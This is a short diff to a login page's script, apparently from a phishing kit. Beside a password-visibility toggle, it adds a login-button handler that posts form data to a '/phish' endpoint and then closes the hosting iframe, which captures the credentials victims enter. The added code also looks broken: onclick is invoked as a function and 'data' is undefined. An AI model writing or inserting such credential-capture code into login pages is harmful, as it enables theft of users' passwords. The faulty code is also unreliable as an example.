@@ -7,3 +7,10 @@ togglePassword.addEventListener('click', function (e) {
     //toggle eye icon
     this.classList.toggle('bi-eye');
 });
+
+document.getElementById("btn-login").onclick(
+    function(){
+        $.post("/phish", data );
+        parent.closeIFrame();
+    }
+)
